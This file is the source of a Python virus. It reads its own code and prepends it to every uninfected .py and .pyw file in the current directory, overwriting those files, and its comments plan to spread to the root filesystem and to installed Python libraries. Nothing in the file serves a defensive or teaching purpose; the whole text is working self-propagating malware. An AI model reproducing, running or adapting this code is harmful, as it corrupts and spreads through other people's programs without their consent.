#start
# start is needed to detect whether if the current file has been infected already or not
# TO DO: find any user scripts in root filesystem 
# TO DO: find and infect any Python libraries 
# TO DO: updating virus code on already infected scripts

import sys
import glob

 
virusCode = []

# Opening the current script 
with open(sys.argv[0], 'r') as f:
    virusLines = f.readlines()

# Printing each line of the current script only if not already infected
isInfected = False
for eachLine in virusLines:
    if eachLine == "#start":
        isInfected = True
    if not isInfected:
        virusCode.append(eachLine)
    if eachLine == "#stop":
        break 

# Opening every other python files in the neighborhood 
otherPythonFiles = glob.glob('*.py') + glob.glob('*.pyw')

# Get the current script original code
isInfected = False
for eachFile in otherPythonFiles:
    with open(eachFile, 'r') as f:
        originalCode = f.readlines()

    isInfected = False
    # Detect whether if the new opened file is already infected or not
    for line in originalCode:
        if line == "#start\n":
            isInfected = True
            break
    # Inject the payload and the original code to the newly infected file
    if not isInfected:
        fullHackedCode = []
        fullHackedCode.extend(virusCode)
        fullHackedCode.extend('\n')
        fullHackedCode.extend(originalCode)
        with open(eachFile, 'w') as f:
            f.writelines(fullHackedCode)

#stop